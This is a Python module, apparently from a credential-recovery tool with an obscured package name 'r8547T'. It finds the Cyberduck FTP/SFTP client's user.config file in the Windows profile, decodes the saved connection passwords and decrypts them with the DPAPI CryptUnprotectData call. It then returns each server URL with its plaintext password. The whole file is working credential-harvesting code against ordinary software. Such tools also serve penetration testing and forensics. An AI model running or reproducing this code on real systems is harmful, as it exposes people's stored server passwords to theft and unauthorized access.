# -*- coding: utf-8 -*- 
import base64

from xml.etree.cElementTree import ElementTree

from r8547T.base.module_info import ModuleInfo
from r8547T.base.winstructure import Win32CryptUnprotectData
from r8547T.base.constant import constant
from r8547T.base.winstructure import string_to_unicode

import os


class Cyberduck(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'cyberduck', 'sysadmin', winapi_used=True)

    # find the user.config file containing passwords
    def get_application_path(self):
        directory = os.path.join(constant.profile['APPDATA'], u'Cyberduck')
        if os.path.exists(directory):
            for dr in os.listdir(directory):
                if dr.startswith(u'Cyberduck'):
                    for d in os.listdir(os.path.join(directory, string_to_unicode(dr))):
                        path = os.path.join(directory, string_to_unicode(dr), string_to_unicode(d), u'user.config')
                        return path

    def run(self):
        xml_file = self.get_application_path()
        if xml_file and os.path.exists(xml_file):
            tree = ElementTree(file=xml_file)

            pwd_found = []
            for elem in tree.iter():
                try:
                    if elem.attrib['name'].startswith('ftp') or elem.attrib['name'].startswith('ftps') \
                            or elem.attrib['name'].startswith('sftp') or elem.attrib['name'].startswith('http') \
                            or elem.attrib['name'].startswith('https'):
                        encrypted_password = base64.b64decode(elem.attrib['value'])
                        password = Win32CryptUnprotectData(encrypted_password, is_current_user=constant.is_current_user, user_dpapi=constant.user_dpapi)
                        pwd_found.append({
                            'URL': elem.attrib['name'],
                            'Password': password,
                        })
                except Exception as e:
                    self.debug(str(e))

            return pwd_found
